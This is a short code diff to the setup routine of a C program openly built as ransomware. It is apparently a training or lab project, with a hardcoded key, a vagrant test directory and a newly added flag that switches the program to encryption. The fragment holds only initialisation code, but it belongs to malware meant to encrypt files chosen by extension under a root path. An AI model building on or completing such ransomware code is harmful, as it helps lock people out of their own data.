@@ -22,11 +22,13 @@ ransom_t *init_struct(ransom_t *ransom)
 	 **/
 	ransom->target_file_buf->filepath = my_calloc(PATH_MAX, sizeof(char));
 	ransom->target_file_buf->buf = my_calloc(BIGBUF * sizeof(char), sizeof(char));
+	/* init file_offset and bytes_read */
 	ransom->target_file_buf->file_offset = 0;
 	ransom->target_file_buf->bytes_read = 0;
+
 	ransom->key = "Holberton";
 	ransom->salt = salt;
-
+	ransom->cipher_flag = 'e'; /* set cipher_flag to encrypt */
 	ransom->root_path = "/home/vagrant/FourNights/TESTS/";
 	lstat(file_exts, &(ransom->target_file_buf->file_info));
 	if(read_file(file_exts, ransom, tokenizer) < 1)
@@ -36,6 +38,7 @@ ransom_t *init_struct(ransom_t *ransom)
 #endif
 		return(NULL);
 	}
+	/* reset file_offset and bytes_read */
 	ransom->target_file_buf->file_offset = 0;
 	ransom->target_file_buf->bytes_read = 0;
 
